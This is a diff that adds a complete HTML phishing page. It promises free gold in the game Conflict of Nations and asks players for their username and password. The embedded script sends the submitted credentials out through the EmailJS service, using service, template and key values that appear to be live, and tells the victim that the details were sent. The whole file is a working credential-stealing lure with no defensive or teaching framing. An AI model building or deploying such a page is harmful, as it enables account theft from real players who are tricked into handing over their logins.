@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Gold - Conflict of Nations</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <style>
+        form {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            display: inline-block;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+        }
+        input {
+            padding: 10px;
+            margin-bottom: 20px;
+            width: 100%;
+            max-width: 300px;
+        }
+        button {
+            background: #28a745;
+            color: #ffffff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 300px;
+        }
+    </style>
+</head>
+<body style="text-align: center; font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px;">
+    <h1 style="color: #ff0000;">WRITE IN YOUR USERNAME AND PASSWORD TO EARN FREE GOLD</h1>
+    <p>Enter your details below to claim amazing rewards in Conflict of Nations!</p>
+
+    <form id="goldForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        
+        <button type="submit">Claim Free Gold</button>
+    </form>
+
+    <script>
+        emailjs.init("1_gwoX9qLCagAFh4b");
+
+        document.getElementById('goldForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            var templateParams = {
+                username: username,
+                password: password
+            };
+
+            emailjs.send("service_wi6rvtb", "template_x2kz1cb", templateParams)
+                .then(function(response) {
+                    alert('Success! Your details have been sent.');
+                }, function(error) {
+                    alert('Failed to send the email. Error: ' + JSON.stringify(error));
+                });
+        });
+    </script>
+</body>
+</html>
